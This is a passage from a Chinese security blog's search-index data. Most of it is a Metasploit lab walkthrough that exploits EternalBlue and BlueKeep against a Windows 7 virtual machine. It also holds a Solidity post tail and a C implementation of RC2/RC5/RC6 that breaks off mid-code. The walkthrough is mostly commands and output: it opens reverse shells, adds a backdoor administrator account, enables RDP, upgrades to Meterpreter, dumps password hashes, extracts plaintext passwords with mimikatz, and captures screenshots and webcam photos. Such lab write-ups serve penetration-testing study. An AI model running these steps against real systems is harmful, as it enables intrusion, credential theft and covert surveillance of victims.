x.echo(&apos;This is assassinq.&apos;)&apos;This is assassinq.&apos; Referenceshttps://blog.csdn.net/liyuechun520/article/details/78036363https://blog.csdn.net/weixin_42595515https://www.jianshu.com/p/983122b8243ehttp://blog.sina.com.cn/s/blog_bad31d930102xa1l.html","categories":[],"tags":[{"name":"blockchain","slug":"blockchain","permalink":"blog.b3ale.cn/tags/blockchain/"},{"name":"sol","slug":"sol","permalink":"blog.b3ale.cn/tags/sol/"}]},{"title":"Have Fun with Metasploit-Framework","slug":"Have-Fun-with-Metasploit-Framework","date":"2019-09-16T08:51:20.000Z","updated":"2019-09-24T08:42:29.858Z","comments":true,"path":"2019/09/16/Have-Fun-with-Metasploit-Framework/","link":"","permalink":"blog.b3ale.cn/2019/09/16/Have-Fun-with-Metasploit-Framework/","excerpt":"使用 Metasploit-Framework 复现 EternalBlue 以及 BlueKeep。","text":"使用 Metasploit-Framework 复现 EternalBlue 以及 BlueKeep。 Metasploit-FrameworkMetasploit 项目是一个旨在提供安全漏洞信息计算机安全项目，可以协助安全工程师进行渗透测试（penetration testing）及入侵检测系统签名开发。其最为知名的子项目是开源的 Metasploit 框架，一套针对远程主机进行开发和执行“exploit 代码”的工具。其他重要的子项目包括 Opcode 数据库、shellcode 档案、安全研究等内容。 在本实验中使用 Kali Linux 下的 Metasploit Framework。 Environment VMware Fusion：专业版 11.1.0 LHOST：Kali Rolling (2019.2) x64（IP：192.168.1.109） RHOST：Windows 7 SP1 旗舰版 (64 位)（IP：192.168.1.102） EternalBlueIntro永恒之蓝是美国国家安全局开发的漏洞利用程序，于 2017 年 4 月 14 日被黑客组织影子掮客泄漏。该工具利用 445/TCP 端口的档案分享协议的漏洞进行散播。尽管微软于 2017 年 3 月 14 日已经发布过 Microsoft Windows 补丁修补了这个漏洞，然而在 5 月 12 日 WannaCry 勒索软体利用这个漏洞传播时，很多用户仍然因为没有安装补丁而受害。由于 WannaCry 的严重性，微软于 2017 年 5 月 13 日为已超过支持周期的 Microsoft Windows XP、Microsoft Windows 8 和 Windows Server 2003 发布了紧急安全更新，以阻止其散布造成更大的危害。 下面通过 Metasploit Framework 对 EternalBlue 进行利用。 Scan先使用 auxiliary/scanner/smb/smb_ms17_010 模块对靶机进行扫描： 12345678910111213141516171819202122232425msf5 &gt; use auxiliary/scanner/smb/smb_ms17_010msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; set rhosts 192.168.1.102rhosts =&gt; 192.168.1.102msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; show optionsModule options (auxiliary/scanner/smb/smb_ms17_010): Name Current Setting Required Description ---- --------------- -------- ----------- CHECK_ARCH true no Check for architecture on vulnerable hosts CHECK_DOPU true no Check for DOUBLEPULSAR on vulnerable hosts CHECK_PIPE false no Check for named pipe on vulnerable hosts NAMED_PIPES /usr/share/metasploit-framework/data/wordlists/named_pipes.txt yes List of named pipes to check RHOSTS 192.168.1.102 yes The target address range or CIDR identifier RPORT 445 yes The SMB service port (TCP) SMBDomain . no The Windows domain to use for authentication SMBPass no The password for the specified username SMBUser no The username to authenticate as THREADS 1 yes The number of concurrent threadsmsf5 auxiliary(scanner/smb/smb_ms17_010) &gt; run[+] 192.168.1.102:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)[*] 192.168.1.102:445 - Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completed Exploit确定存在漏洞后使用 exploit/windows/smb/ms17_010_eternalblue 模块攻击，并得到 CMD Shell： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556msf5 &gt; use exploit/windows/smb/ms17_010_eternalbluemsf5 exploit(windows/smb/ms17_010_eternalblue) &gt; set rhosts 192.168.1.102rhosts =&gt; 192.168.1.102msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; show optionsModule options (exploit/windows/smb/ms17_010_eternalblue): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS 192.168.1.102 yes The target address range or CIDR identifier RPORT 445 yes The target port (TCP) SMBDomain . no (Optional) The Windows domain to use for authentication SMBPass no (Optional) The password for the specified username SMBUser no (Optional) The username to authenticate as VERIFY_ARCH true yes Check if remote architecture matches exploit Target. VERIFY_TARGET true yes Check if remote OS matches exploit Target.Exploit target: Id Name -- ---- 0 Windows 7 and Server 2008 R2 (x64) All Service Packsmsf5 exploit(windows/smb/ms17_010_eternalblue) &gt; exploit[*] Started reverse TCP handler on 192.168.1.109:4444[+] 192.168.1.102:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)[*] 192.168.1.102:445 - Connecting to target for exploitation.[+] 192.168.1.102:445 - Connection established for exploitation.[+] 192.168.1.102:445 - Target OS selected valid for OS indicated by SMB reply[*] 192.168.1.102:445 - CORE raw buffer dump (38 bytes)[*] 192.168.1.102:445 - 0x00000000 57 69 6e 64 6f 77 73 20 37 20 55 6c 74 69 6d 61 Windows 7 Ultima[*] 192.168.1.102:445 - 0x00000010 74 65 20 37 36 30 31 20 53 65 72 76 69 63 65 20 te 7601 Service[*] 192.168.1.102:445 - 0x00000020 50 61 63 6b 20 31 Pack 1[+] 192.168.1.102:445 - Target arch selected valid for arch indicated by DCE/RPC reply[*] 192.168.1.102:445 - Trying exploit with 12 Groom Allocations.[*] 192.168.1.102:445 - Sending all but last fragment of exploit packet[*] 192.168.1.102:445 - Starting non-paged pool grooming[+] 192.168.1.102:445 - Sending SMBv2 buffers[+] 192.168.1.102:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.[*] 192.168.1.102:445 - Sending final SMBv2 buffers.[*] 192.168.1.102:445 - Sending last fragment of exploit packet![*] 192.168.1.102:445 - Receiving response from exploit packet[+] 192.168.1.102:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)![*] 192.168.1.102:445 - Sending egg to corrupted connection.[*] 192.168.1.102:445 - Triggering free of corrupted buffer.[*] Command shell session 1 opened (192.168.1.109:4444 -&gt; 192.168.1.102:49161) at 2019-09-17 02:41:44 -0400[+] 192.168.1.102:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=[+] 192.168.1.102:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=[+] 192.168.1.102:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=C:\\Windows\\system32&gt; BlueKeepIntroBlueKeep（CVE-2019-0708）是 Microsoft 远程桌面协议实现中发现的一个安全漏洞，它允许远程执行代码。首次报告于 2019 年 5 月，它存在于从 Windows 2000 到 Windows Server 2008 R2 和 Windows 7 的所有未修补的基于 Windows NT 的 Microsoft Windows 版本中。Microsoft 发布了一个安全补丁（包括几个版本的带外更新） 在 2019 年 5 月 14 日，已经达到其寿命结束的 Windows，例如 Windows XP。在 2019 年 8 月 13 日，据报道，相关的 BlueKeep 安全漏洞（统称为 DejaBlue）会影响较新的 Windows 版本，包括 Windows 7 和所有最新版本 高达 Windows 10 的操作系统，以及较旧的 Windows 版本。2019 年 9 月 6 日，Metasploit 利用可疑的 BlueKeep 安全漏洞宣布已经发布到公共领域。 下面通过 Metasploit Framework 对 BlueKeep 进行利用，具体脚本来自 Github。 Scan先使用 auxiliary/scanner/rdp/cve_2019_0708_bluekeep 模块对靶机进行扫描： 12345678910111213141516171819202122232425262728293031msf5 &gt; use auxiliary/scanner/rdp/cve_2019_0708_bluekeepmsf5 auxiliary(scanner/rdp/cve_2019_0708_bluekeep) &gt; set rhosts 192.168.1.102rhosts =&gt; 192.168.1.102msf5 auxiliary(scanner/rdp/cve_2019_0708_bluekeep) &gt; show optionsModule options (auxiliary/scanner/rdp/cve_2019_0708_bluekeep): Name Current Setting Required Description ---- --------------- -------- ----------- RDP_CLIENT_IP 192.168.0.100 yes The client IPv4 address to report during connect RDP_CLIENT_NAME rdesktop no The client computer name to report during connect, UNSET = random RDP_DOMAIN no The client domain name to report during connect RDP_USER no The username to report during connect, UNSET = random RHOSTS 192.168.1.102 yes The target address range or CIDR identifier RPORT 3389 yes The target port (TCP) THREADS 1 yes The number of concurrent threadsAuxiliary action: Name Description ---- ----------- Scan Scan for exploitable targetsmsf5 auxiliary(scanner/rdp/cve_2019_0708_bluekeep) &gt; run[*] 192.168.1.102:3389 - Detected RDP on 192.168.1.102:3389 (Windows version: 6.1.7601) (Requires NLA: No)[+] 192.168.1.102:3389 - The target is vulnerable.[*] 192.168.1.102:3389 - Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completed Exploit确定存在漏洞后使用 exploit/windows/smb/ms17_010_eternalblue 模块攻击，并得到 CMD Shell： 12345678910111213141516171819202122232425262728293031323334353637383940msf5 &gt; use exploit/windows/rdp/cve_2019_0708_bluekeep_rcemsf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; set rhosts 192.168.1.102rhosts =&gt; 192.168.1.102msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; set target 3target =&gt; 3msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; show optionsModule options (exploit/windows/rdp/cve_2019_0708_bluekeep_rce): Name Current Setting Required Description ---- --------------- -------- ----------- RDP_CLIENT_IP 192.168.0.100 yes The client IPv4 address to report during connect RDP_CLIENT_NAME ethdev no The client computer name to report during connect, UNSET = random RDP_DOMAIN no The client domain name to report during connect RDP_USER no The username to report during connect, UNSET = random RHOSTS 192.168.1.102 yes The target address range or CIDR identifier RPORT 3389 yes The target port (TCP)Exploit target: Id Name -- ---- 3 Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare)msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; exploit[*] Started reverse TCP handler on 192.168.1.109:4444[*] 192.168.1.102:3389 - Detected RDP on 192.168.1.102:3389 (Windows version: 6.1.7601) (Requires NLA: No)[+] 192.168.1.102:3389 - The target is vulnerable.[*] 192.168.1.102:3389 - Using CHUNK grooming strategy. Size 250MB, target address 0xfffffa8028600000, Channel count 1.[*] 192.168.1.102:3389 - Surfing channels ...[*] 192.168.1.102:3389 - Lobbing eggs ...[*] 192.168.1.102:3389 - Forcing the USE of FREE&apos;d object ...[*] Command shell session 2 opened (192.168.1.109:4444 -&gt; 192.168.1.102:49162) at 2019-09-17 02:47:40 -0400C:\\Windows\\system32&gt; Post Exploitation在获取到 CMD Shell 之后可以做更多好玩的事情，比如使用 Meterpreter 进行后渗透等等，这里只记录一部分。 新建用户并进行远程连接在得到一个 CMD Shell 后，可以新建一个用户并加入管理员组： 12345678C:\\Windows\\system32&gt;net user hacker hacker /addnet user hacker hacker /add����ɹ���ɡ�C:\\Windows\\system32&gt;net localgroup administrators hacker /addnet localgroup administrators hacker /add����ɹ���ɡ� 开启远程连接： 12C:\\Windows\\system32&gt;REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 0 /f����ɹ���ɡ� 然后使用 Kali 下的远程桌面进行连接，使用新创建的用户 hacker 登录： 12rdesktop 192.168.1.102:3389# rdesktop 192.168.1.102 -u hacker -p hacker 将普通的 CMD Shell 升级为 Meterpreter原本的 CMD Shell 可以做的事情有限，使用 sessions 命令升级到 Meterpreter 可以做更多好玩的事。 12345678910111213141516171819202122232425262728293031msf5 &gt; sessionsActive sessions=============== Id Name Type Information Connection -- ---- ---- ----------- ---------- 1 shell x64/windows Microsoft Windows [_ 6.1.7601] _ (c) 2009 Microsoft Corporation_ C:\\Windows\\s... 192.168.1.109:4444 -&gt; 192.168.1.102:49161 (192.168.1.102) 2 shell x64/windows Microsoft Windows [_ 6.1.7601] _ (c) 2009 Microsoft Corporation_ C:\\Windows\\s... 192.168.1.109:4444 -&gt; 192.168.1.102:49162 (192.168.1.102)msf5 &gt; sessions -u 1[*] Executing &apos;post/multi/manage/shell_to_meterpreter&apos; on session(s): [1][*] Upgrading session ID: 1[*] Starting exploit/multi/handler[*] Started reverse TCP handler on 192.168.1.109:4433msf5 &gt;[*] Sending stage (179779 bytes) to 192.168.1.102[*] Meterpreter session 3 opened (192.168.1.109:4433 -&gt; 192.168.1.102:49163) at 2019-09-17 02:55:12 -0400[*] Stopping exploit/multi/handlermsf5 &gt; sessionsActive sessions=============== Id Name Type Information Connection -- ---- ---- ----------- ---------- 1 shell x64/windows Microsoft Windows [_ 6.1.7601] _ (c) 2009 Microsoft Corporation_ C:\\Windows\\s... 192.168.1.109:4444 -&gt; 192.168.1.102:49161 (192.168.1.102) 2 shell x64/windows Microsoft Windows [_ 6.1.7601] _ (c) 2009 Microsoft Corporation_ C:\\Windows\\s... 192.168.1.109:4444 -&gt; 192.168.1.102:49162 (192.168.1.102) 3 meterpreter x86/windows NT AUTHORITY\\SYSTEM @ WIN-Q595JS8OROC 192.168.1.109:4433 -&gt; 192.168.1.102:49163 (192.168.1.102) 多了一个 session 3，打开后得到 Meterpreter 的 Shell： 1234msf5 &gt; sessions 3[*] Starting interaction with 3...meterpreter &gt; 然后可以看到得到的 Meterpreter 是 32 位的，可以通过把它绑定到某个 64 位的程序（所属用户为 SYSTEM）来修改成 64 位： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283meterpreter &gt; sysinfoComputer : WIN-Q1ST6EBNLTROS : Windows 7 (Build 7601, Service Pack 1).Architecture : x64System Language : zh_CNDomain : WORKGROUPLogged On Users : 2Meterpreter : x86/windowsmeterpreter &gt; psProcess List============ PID PPID Name Arch Session User Path --- ---- ---- ---- ------- ---- ---- 0 0 [System Process] 4 0 System x64 0 100 780 audiodg.exe x64 0 268 4 smss.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\smss.exe 352 344 csrss.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\csrss.exe 404 344 wininit.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\wininit.exe 416 396 csrss.exe x64 1 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\csrss.exe 420 2584 mscorsvw.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\mscorsvw.exe 464 396 winlogon.exe x64 1 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\winlogon.exe 512 404 services.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\services.exe 520 404 lsass.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\lsass.exe 528 404 lsm.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\lsm.exe 572 512 svchost.exe x64 0 NT AUTHORITY\\LOCAL SERVICE 632 512 svchost.exe x64 0 NT AUTHORITY\\SYSTEM 696 512 vmacthlp.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Program Files\\VMware\\VMware Tools\\vmacthlp.exe 728 512 svchost.exe x64 0 NT AUTHORITY\\NETWORK SERVICE 780 512 svchost.exe x64 0 NT AUTHORITY\\LOCAL SERVICE 896 512 svchost.exe x64 0 NT AUTHORITY\\SYSTEM 960 2584 mscorsvw.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\mscorsvw.exe 964 512 svchost.exe x64 0 NT AUTHORITY\\SYSTEM 1096 512 svchost.exe x64 0 NT AUTHORITY\\NETWORK SERVICE 1192 512 spoolsv.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\spoolsv.exe 1228 512 svchost.exe x64 0 NT AUTHORITY\\LOCAL SERVICE 1240 512 svchost.exe x64 0 NT AUTHORITY\\SYSTEM 1300 512 msdtc.exe x64 0 NT AUTHORITY\\NETWORK SERVICE 1440 512 VGAuthService.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Program Files\\VMware\\VMware Tools\\VMware VGAuth\\VGAuthService.exe 1464 512 vmtoolsd.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe 1624 512 sppsvc.exe x64 0 NT AUTHORITY\\NETWORK SERVICE 1704 512 svchost.exe x64 0 NT AUTHORITY\\LOCAL SERVICE 1744 512 mscorsvw.exe x86 0 NT AUTHORITY\\SYSTEM C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\mscorsvw.exe 1768 512 svchost.exe x64 0 NT AUTHORITY\\NETWORK SERVICE 1836 352 conhost.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\conhost.exe 1844 512 dllhost.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\dllhost.exe 1860 632 WmiPrvSE.exe 1984 512 dllhost.exe x64 0 NT AUTHORITY\\SYSTEM 2000 512 svchost.exe x64 0 NT AUTHORITY\\LOCAL SERVICE 2084 512 VSSVC.exe x64 0 NT AUTHORITY\\SYSTEM 2116 2424 cmd.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\cmd.exe 2192 2116 powershell.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe 2228 632 WmiPrvSE.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\wbem\\WmiPrvSE.exe 2320 512 taskhost.exe x64 1 WIN-Q1ST6EBNLTR\\victim C:\\Windows\\System32\\taskhost.exe 2368 352 conhost.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\conhost.exe 2392 896 dwm.exe x64 1 WIN-Q1ST6EBNLTR\\victim C:\\Windows\\System32\\dwm.exe 2404 2384 explorer.exe x64 1 WIN-Q1ST6EBNLTR\\victim C:\\Windows\\explorer.exe 2424 1192 cmd.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\cmd.exe 2516 512 svchost.exe x64 0 NT AUTHORITY\\SYSTEM 2548 512 WmiApSrv.exe x64 0 NT AUTHORITY\\SYSTEM 2584 512 mscorsvw.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\mscorsvw.exe 2756 512 SearchIndexer.exe x64 0 NT AUTHORITY\\SYSTEM 2852 2756 SearchFilterHost.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\SearchFilterHost.exe 2888 2756 SearchProtocolHost.exe x64 0 NT AUTHORITY\\SYSTEM C:\\Windows\\System32\\SearchProtocolHost.exe 2968 2404 cmd.exe x64 1 WIN-Q1ST6EBNLTR\\victim C:\\Windows\\System32\\cmd.exe 2976 416 conhost.exe x64 1 WIN-Q1ST6EBNLTR\\victim C:\\Windows\\System32\\conhost.exe 3060 3020 powershell.exe x86 0 NT AUTHORITY\\SYSTEM C:\\Windows\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exemeterpreter &gt; migrate 2368[*] Migrating from 3060 to 2368...[*] Migration completed successfully.meterpreter &gt; sysinfoComputer : WIN-Q1ST6EBNLTROS : Windows 7 (Build 7601, Service Pack 1).Architecture : x64System Language : zh_CNDomain : WORKGROUPLogged On Users : 2Meterpreter : x64/windowsmeterpreter &gt; getuidServer username: NT AUTHORITY\\SYSTEM 获取用户密码利用 hashdump 可以获得所有用户密码的哈希值： 1234567891011121314151617181920212223meterpreter &gt; run hashdump[!] Meterpreter scripts are deprecated. Try post/windows/gather/smart_hashdump.[!] Example: run post/windows/gather/smart_hashdump OPTION=value [...][*] Obtaining the boot key...[*] Calculating the hboot key using SYSKEY a648199744904bf08ff1b92b5b224011.../usr/share/metasploit-framework/lib/rex/script/base.rb:134: warning: constant OpenSSL::Cipher::Cipher is deprecated[*] Obtaining the user list and keys...[*] Decrypting user keys.../usr/share/metasploit-framework/lib/rex/script/base.rb:268: warning: constant OpenSSL::Cipher::Cipher is deprecated/usr/share/metasploit-framework/lib/rex/script/base.rb:272: warning: constant OpenSSL::Cipher::Cipher is deprecated/usr/share/metasploit-framework/lib/rex/script/base.rb:279: warning: constant OpenSSL::Cipher::Cipher is deprecated[*] Dumping password hints...No users with password hints on this system[*] Dumping password hashes...Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::victim:1000:aad3b435b51404eeaad3b435b51404ee:3008c87294511142799dca1191e69a0f:::hacker:1001:aad3b435b51404eeaad3b435b51404ee:5e7599f673df11d5c5c4d950f5bf0157::: 使用神器 mimikatz 有可能能得到密码的明文： 1234567891011121314151617meterpreter &gt; load mimikatzLoading extension mimikatz...[!] Loaded Mimikatz on a newer OS (Windows 7 (Build 7601, Service Pack 1).). Did you mean to &apos;load kiwi&apos; instead?Success.meterpreter &gt; wdigest[+] Running as SYSTEM[*] Retrieving wdigest credentialswdigest credentials===================AuthID Package Domain User Password------ ------- ------ ---- --------0;997 Negotiate NT AUTHORITY LOCAL SERVICE0;996 Negotiate WORKGROUP WIN-Q1ST6EBNLTR$0;52252 NTLM0;999 NTLM WORKGROUP WIN-Q1ST6EBNLTR$0;333800 NTLM WIN-Q1ST6EBNLTR victim admin1230;333754 NTLM WIN-Q1ST6EBNLTR victim admin123 截取屏幕使用 screenshot 可以截取桌面实时图片： 12meterpreter &gt; screenshotScreenshot saved to: /root/NjEXrhqY.jpeg 用摄像头拍照使用 webcam 系列命令可以用摄像头拍照： 1234567meterpreter &gt; webcam_list1: VMware Virtual USB Video Devicemeterpreter &gt; webcam_snap[*] Starting...[+] Got frame[*] StoppedWebcam shot saved to: /root/jkhYoacC.jpeg Referenceshttps://blog.51cto.com/chenxinjie/2092754https://mp.weixin.qq.com/s/swR4LjNJgHsx2VetyM6G5Qhttps://www.anquanke.com/post/id/164525https://zhuanlan.zhihu.com/p/25857679https://xz.aliyun.com/t/2536http://hardsec.net/mimikatz-meterpreter-extension/?lang=en","categories":[],"tags":[{"name":"cve","slug":"cve","permalink":"blog.b3ale.cn/tags/cve/"},{"name":"kali","slug":"kali","permalink":"blog.b3ale.cn/tags/kali/"}]},{"title":"C语言实现RC2、RC5、RC6加密解密算法","slug":"C语言实现RC2、RC5、RC6加密解密算法","date":"2019-09-03T05:38:28.000Z","updated":"2019-09-06T09:17:29.717Z","comments":true,"path":"2019/09/03/C语言实现RC2、RC5、RC6加密解密算法/","link":"","permalink":"blog.b3ale.cn/2019/09/03/C语言实现RC2、RC5、RC6加密解密算法/","excerpt":"RC 算法是由 Ron Rivest 发明的一系列对称密钥加密算法。虽然这一系列的算法名字相似，但实际上算法之间没有太大的关联。","text":"RC 算法是由 Ron Rivest 发明的一系列对称密钥加密算法。虽然这一系列的算法名字相似，但实际上算法之间没有太大的关联。 Intro现在总共有六个 RC 系列的算法。其中 RC1 从来没有发布过，RC3 在开始使用前就被证明是不安全的。余下的都是现如今有所运用的算法。 RC2 是一个于 1987 年发布的 64 位分组加密算法。 RC4 是当今运用最广泛的序列密码。我在之前的文章中实现过。 RC5 是一个于 1994 年发布的 32/64/128 位分组加密算法。 RC6 是一个于 1997 年发布的基于 RC5 的 128 位分组加密算法，在当年 AES 的评选中曾是 AES 决赛算法。 了解过算法的基本知识后，下面是 RC2、RC5 以及 RC6 在 C 语言下的实现。 RC2RC2 是一种分组密码，和 DES 很像，它的输入和输出的长度都是 64 位，而密钥是可变的，长度范围是从 1 到 128 比特，目前使用的是 8 比特的密钥。RC2 被设计成能够在 16 位处理器上运行。在 IBM AT 上它能够比 DES 的加密速度快一倍（假设在完成密钥扩展的情况下）。 RC2 总共分为三个算法步骤。分别是密钥扩展、加密、解密。 密钥扩展算法密钥扩展通过一个长度变化的密钥生成 64 个字数组。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051void rc2_keygen(unsigned short xkey[64], const unsigned char *key, unsigned len, unsigned bits)&#123; unsigned char x; unsigned i; /* 256-entry permutation table, probably derived somehow from pi */ static const unsigned char PITABLE[256] = &#123;0xD9, 0x78, 0xF9, 0xC4, 0x19, 0xDD, 0xB5, 0xED, 0x28, 0xE9, 0xFD, 0x79, 0x4A, 0xA0, 0xD8, 0x9D, 0xC6, 0x7E, 0x37, 0x83, 0x2B, 0x76, 0x53, 0x8E, 0x62, 0x4C, 0x64, 0x88, 0x44, 0x8B, 0xFB, 0xA2, 0x17, 0x9A, 0x59, 0xF5, 0x87, 0xB3, 0x4F, 0x13, 0x61, 0x45, 0x6D, 0x8D, 0x09, 0x81, 0x7D, 0x32, 0xBD, 0x8F, 0x40, 0xEB, 0x86, 0xB7, 0x7B, 0x0B, 0xF0, 0x95, 0x21, 0x22, 0x5C, 0x6B, 0x4E, 0x82, 0x54, 0xD6, 0x65, 0x93, 0xCE, 0x60, 0xB2, 0x1C, 0x73, 0x56, 0xC0, 0x14, 0xA7, 0x8C, 0xF1, 0xDC, 0x12, 0x75, 0xCA, 0x1F, 0x3B, 0xBE, 0xE4, 0xD1, 0x42, 0x3D, 0xD4, 0x30, 0xA3, 0x3C, 0xB6, 0x26, 0x6F, 0xBF, 0x0E, 0xDA, 0x46, 0x69, 0x07, 0x57, 0x27, 0xF2, 0x1D, 0x9B, 0xBC, 0x94, 0x43, 0x03, 0xF8, 0x11, 0xC7, 0xF6, 0x90, 0xEF, 0x3E, 0xE7, 0x06, 0xC3, 0xD5, 0x2F, 0xC8, 0x66, 0x1E, 0xD7, 0x08, 0xE8, 0xEA, 0xDE, 0x80, 0x52, 0xEE, 0xF7, 0x84, 0xAA, 0x72, 0xAC, 0x35, 0x4D, 0x6A, 0x2A, 0x96, 0x1A, 0xD2, 0x71, 0x5A, 0x15, 0x49, 0x74, 0x4B, 0x9F, 0xD0, 0x5E, 0x04, 0x18, 0xA4, 0xEC, 0xC2, 0xE0, 0x41, 0x6E, 0x0F, 0x51, 0xCB, 0xCC, 0x24, 0x91, 0xAF, 0x50, 0xA1, 0xF4, 0x70, 0x39, 0x99, 0x7C, 0x3A, 0x85, 0x23, 0xB8, 0xB4, 0x7A, 0xFC, 0x02, 0x36, 0x5B, 0x25, 0x55, 0x97, 0x31, 0x2D, 0x5D, 0xFA, 0x98, 0xE3, 0x8A, 0x92, 0xAE, 0x05, 0xDF, 0x29, 0x10, 0x67, 0x6C, 0xBA, 0xC9, 0xD3, 0x00, 0xE6, 0xCF, 0xE1, 0x9E, 0xA8, 0x2C, 0x63, 0x16, 0x01, 0x3F, 0x58, 0xE2, 0x89, 0xA9, 0x0D, 0x38, 0x34, 0x1B, 0xAB, 0x33, 0xFF, 0xB0, 0xBB, 0x48, 0x0C, 0x5F, 0xB9, 0xB1, 0xCD, 0x2E, 0xC5, 0xF3, 0xDB, 0x47, 0xE5, 0xA5, 0x9C, 0x77, 0x0A, 0xA6, 0x20, 0x68, 0xFE, 0x7F, 0xC1, 0xAD&#125;; assert(len &gt; 0 &amp;&amp; len &lt;= 128); assert(bits &lt;= 1024); if (!bits) bits = 1024; memcpy(xkey, key, len); /* Phase 1: Expand input key to 128 bytes */ // for i = T, T+1, ..., 127 do // L[i] = PITABLE[L[i-1] + L[i-T]]; if (len &lt; 128) &#123; i = 0; x = ((unsigned char *)xkey)[len - 1]; do &#123; x = PITABLE[(x + ((unsigned char *)xkey)[i++]) &amp; 255]; ((unsigned char *)xkey)[len++] = x; &#125; while (len &lt; 128); &#125; /* Phase 2 - reduce effective key size to \"bits\" */ // L[128-T8] = PITABLE[L[128-T8] &amp; TM]; len = (bits + 7) &gt;&gt; 3; // bits = T1, len = T8, T8 = (T1+7)/8; i = 128 - len; x = PITABLE[((unsigned char *)xkey)[i] &amp; (255 &gt;&gt; (7 &amp; -bits))]; // (255 &gt;&gt; (7 &amp; -bits) = TM, TM = 255 MOD 2^(8 + T1 - 8*T8); ((unsigned char *)xkey)[i] = x; // for i = 127-T8, ..., 0 do // L[i] = PITABLE[L[i+1] XOR L[i+T8]]; while (i--) &#123; x = PITABLE[x ^ ((unsigned char *)xkey)[i + len]]; ((unsigned char *)xkey)[i] = x; &#125; /* Phase 3 - copy to xkey in little-endian order */ i = 63; do &#123; xkey[i] = ((unsigned char *)xkey)[2 * i] + (((unsigned char *)xkey)[2 * i + 1] &lt;&lt; 8); &#125; while (i--);&#125; 加密算法加密操作将一组 64 比特的字存入 4 个字中再进行加密。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546void rc2_encrypt(unsigned short xkey[64], unsigned char *plain, unsigned char *cipher)&#123; // xkey = K, plain = R unsigned x76, x54, x32, x10, i; x76 = (plain[7] &lt;&lt; 8) + plain[6]; x54 = (plain[5] &lt;&lt; 8) + plain[4]; x32 = (plain[3] &lt;&lt; 8) + plain[2]; x10 = (plain[1] &lt;&lt; 8) + plain[0]; for (i = 0; i &lt; 16; i++) &#123; // R[i] = R[i] + K[j] + (R[i-1] &amp; R[i-2]) + ((~R[i-1]) &amp; R[i-3]); // j = j + 1; // R[i] = R[i] rol s[i]; x10 += (x32 &amp; ~x76) + (x54 &amp; x76) + xkey[4 * i + 0]; x10 = (x10 &lt;&lt; 1) + (x10 &gt;&gt; 15 &amp; 1); x32 += (x54 &amp; ~x10) + (x76 &amp; x10) + xkey[4 * i + 1]; x32 = (x32 &lt;&lt; 2) + (x32 &gt;&gt; 14 &amp; 3); x54 += (x76 &amp; ~x32) + (x10 &amp; x32) + xkey[4 * i + 2]; x54 = (x54 &lt;&lt; 3) + (x54 &gt;&gt; 13 &amp; 7); x76 += (x10 &amp; ~x54) + (x32 &amp; x54) + xkey[4 * i + 3]; x76 = (x76 &lt;&lt; 5) + (x76 &gt;&gt; 11 &amp; 31); // R[i] = R[i] + K[R[i-1] &amp; 63]; if (i == 